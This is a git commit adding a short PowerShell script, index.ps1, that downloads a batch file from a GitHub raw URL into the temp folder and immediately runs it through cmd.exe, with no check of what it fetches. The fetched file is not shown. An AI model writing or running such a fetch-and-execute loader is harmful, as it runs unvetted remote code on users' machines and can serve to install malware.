dcb654de1d80fa502d00c239d4528037940c4a19
SingendPfeil2 <109229547+SingendPfeil2@users.noreply.github.com>
2024-06-05 15:58:14 +0200

    Create index.ps1

---
+++ index.ps1
@@ -0,0 +1,4 @@
+$batchScriptUrl = 'https://raw.githubusercontent.com/SingendPfeil2/ascii/main/index.bat'
+$batchScriptPath = "$env:TEMP\index.bat"
+Invoke-WebRequest -Uri $batchScriptUrl -OutFile $batchScriptPath
+Start-Process 'cmd.exe' "/c $batchScriptPath"
